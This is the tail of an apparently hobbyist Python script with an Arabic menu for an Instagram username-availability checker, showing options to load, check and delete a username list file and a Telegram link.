		name=input(H+'أدخــل ملــف الــســتـة: \n')
		os.system('clear' if os.name == 'posix' else 'cls')
		print(logo)
		admin_gm(name)
	elif oo==3:
		os.system('clear' if os.name == 'posix' else 'cls')
		print(logo)
		try:
			os.remove('username.txt')
			print(G+'successful Delete List')
		except:
			print('انــت لــم تســحــب لســتة بــل اســاس')
	elif oo==0:
		os.system('clear')
		print(logo)
		print(W+f'''
مــرحبا بك في اداتي اداة مختصة لفحص متــاحات انــســتڪـرام
خــيــار رقــم 1 يــقــوم بــســحب  لــســتة يــوزرات خيــار رقــم 2 يــقــوم بفــحــص الســتــة خــيار رقــم 3 يــقــوم بــحــذف الــسـتة
{Bl}https://t.me/hsopyt
{W}Enter Here 😪👆👆👆			
		''')	
admin()
